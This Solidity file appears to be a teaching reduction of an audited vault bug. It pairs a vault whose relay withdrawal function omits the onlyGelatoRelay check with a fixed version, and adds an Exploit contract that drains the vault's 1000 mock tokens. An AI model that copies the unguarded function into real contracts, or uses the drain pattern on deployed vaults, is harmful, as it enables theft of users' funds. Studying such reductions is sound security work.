// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Tradable TradableSideVault — ForUser withdrawals have no onlyGelatoRelay
    (Zokyo, September 2023).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: withdrawalRequestForUser is the relay entry. It pays
    _msgSender(), and Context._msgSender returns msg.sender. The onlyGelatoRelay
    modifier is missing, so any caller is paid `amount` from the vault.
    The cross-chain marginAccountWithdrawal encoding is settled here as the
    token transfer that encoding requests. Vulnerable line below (@> VULN). */

contract MockToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "token: balance");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract TradableSideVault {
    enum WithdrawalType { Stake, Margin }

    MockToken public token;
    address public gelato;

    constructor(MockToken _token, address _gelato) {
        token = _token;
        gelato = _gelato;
    }

    function _msgSender() internal view returns (address) {
        // @> VULN: missing onlyGelatoRelay, Context returns the caller so any caller is paid
        return msg.sender;
    }

    function withdrawalRequestForUser(
        WithdrawalType withdrawalType,
        address withdrawalToken,
        uint256 amount
    ) external {
        address user = _msgSender();
        require(
            withdrawalType == WithdrawalType.Stake || withdrawalType == WithdrawalType.Margin,
            "type"
        );
        require(amount > 0, "amount");
        MockToken(withdrawalToken).transfer(user, amount);
    }
}

contract TradableSideVaultFixed {
    enum WithdrawalType { Stake, Margin }

    MockToken public token;
    address public gelato;

    modifier onlyGelatoRelay() {
        require(msg.sender == gelato, "onlyGelatoRelay");
        _;
    }

    constructor(MockToken _token, address _gelato) {
        token = _token;
        gelato = _gelato;
    }

    function _msgSender() internal view returns (address) {
        return msg.sender;
    }

    function withdrawalRequestForUser(
        WithdrawalType withdrawalType,
        address withdrawalToken,
        uint256 amount
    ) external onlyGelatoRelay {
        address user = _msgSender();
        require(
            withdrawalType == WithdrawalType.Stake || withdrawalType == WithdrawalType.Margin,
            "type"
        );
        require(amount > 0, "amount");
        MockToken(withdrawalToken).transfer(user, amount);
    }
}

contract Exploit {
    address public constant GELATO = address(0x3333);

    MockToken public token;
    TradableSideVault public vault;

    constructor() {
        token = new MockToken();
        vault = new TradableSideVault(token, GELATO);
        token.mint(address(vault), 1000 ether);
    }

    function run() external {
        require(address(this) != vault.gelato(), "caller is the relay");
        vault.withdrawalRequestForUser(
            TradableSideVault.WithdrawalType.Margin,
            address(token),
            1000 ether
        );
        require(token.balanceOf(address(this)) == 1000 ether, "caller was not paid 1000");
        require(token.balanceOf(address(vault)) == 0, "vault still holds tokens");
    }
}
